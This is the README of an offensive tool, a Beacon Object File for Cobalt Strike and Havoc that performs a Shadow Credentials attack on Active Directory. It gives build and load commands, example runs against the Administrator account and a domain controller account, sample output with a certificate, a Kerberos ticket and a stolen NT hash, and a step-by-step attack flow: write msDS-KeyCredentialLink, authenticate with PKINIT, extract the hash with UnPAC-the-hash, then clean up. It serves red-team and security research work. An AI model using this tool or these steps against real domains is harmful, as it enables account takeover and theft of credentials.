# ShadowCreds-unPAC-BOF

Shadow Credentials attack BOF for Cobalt Strike and Havoc.

**Complete attack chain:** Shadow Credentials → PKINIT → UnPAC-the-hash → Cleanup msDS-KeyCredentialLink

## Demo

https://github.com/user-attachments/assets/d299c9e4-7bc6-4f63-9023-1574d031de52

## Build

```bash
git clone https://github.com/RayRRT/BOFs.git && cd ShadowCreds-unPAC-BOF && make bof
```

## Usage

### Cobalt Strike
1. Script Manager → Load → `shadowcreds.cna`

### Havoc
```
inline-execute /path/to/shadowcreds.x64.o <target> <domain> [kdc]
```

### Command
```
shadowcreds <target> <domain> [kdc]
```

### Example
```
shadowcreds Administrator corp.local
shadowcreds DC01$ corp.local dc01.corp.local
```

## Output

```
[+] Target DN: CN=Administrator,CN=Users,DC=corp,DC=local
[+] Target SID: S-1-5-21-...
[+] Generated RSA keypair (2048-bit)
[+] Built KeyCredential blob
[+] DeviceID: {12345678-1234-1234-1234-123456789abc}
[+] Wrote msDS-KeyCredentialLink successfully!

[+] PFX (base64, no password):
MIIQoQIBAzCCEGcGCSqGSIb3DQEHAaCCEFgEghBUMIIQUDCC...

[+] PKINIT AS-REQ sent
[+] TGT obtained!
[+] TGT (kirbi, base64):
doIFqjCCBaagAwIBBaEDAgEWooIEtjCCBLJhggSuMIIEqqAD...

[+] NT Hash: 32ed87bdb5fdc5e9cba88547376818d4

[*] Cleaning up shadow credential...
[+] Shadow credential removed successfully
```

## Files

```
ShadowCredsBOF/
├── README.md
├── Makefile
├── shadowcreds.cna           # Cobalt Strike aggressor script
├── build/
│   ├── shadowcreds.x64.o     # Compiled BOF (x64)
│   └── shadowcreds.x86.o     # Compiled BOF (x86)
├── src/
│   └── shadowcreds.c         # Complete implementation (single file)
└── include/
    └── beacon.h
```

## Requirements

### Privileges
- Write access to target's `msDS-KeyCredentialLink` attribute (GenericWrite/GenericAll)

### Domain
- Domain Functional Level 2016+ (for PKINIT with certificates)
- PKINIT enabled (default)

### Build
- mingw-w64 (`apt install mingw-w64`)

## Attack Flow

1. **LDAP Lookup** - Query AD for target's DN and SID
2. **Generate Keypair** - Create 2048-bit RSA key and self-signed certificate with UPN/SID SAN
3. **Build KeyCredential** - Construct MS-ADTS KeyCredential blob (version 0x200)
4. **Write Attribute** - Add KeyCredential to target's `msDS-KeyCredentialLink` via LDAP
5. **PKINIT** - Authenticate to KDC using certificate + Diffie-Hellman
6. **UnPAC-the-hash** - Extract NT hash from PA-PAC-CREDENTIALS
7. **Cleanup** - Remove the shadow credential from the attribute

## Technical Details

### KeyCredential Blob Structure (MS-ADTS 2.2.21)
- Version: 0x200
- KeyID: SHA256 of public key
- KeyMaterial: BCRYPT_RSAKEY_BLOB format
- KeyUsage: NGC (0x01)
- KeySource: AD (0x00)
- DeviceID: Random GUID

### Certificate
- Self-signed with UPN SAN (user@domain)
- SID URL for KB5014754 strong mapping
- EKU: Client Authentication + Smart Card Logon

### PKINIT (RFC 4556)
- Uses MODP Group 2 (1024-bit) for Diffie-Hellman
- CMS SignedData with SHA256RSA signature
- kTruncate for session key derivation

## References

- [Certified Pre-Owned - SpecterOps](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [KB5014754 - Strong Certificate Mapping](https://support.microsoft.com/en-us/topic/kb5014754)
- [MS-ADTS - KeyCredentialLink](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts)
- [RFC 4556 - PKINIT](https://tools.ietf.org/html/rfc4556)
- [RFC 4120 - Kerberos V5](https://tools.ietf.org/html/rfc4120)
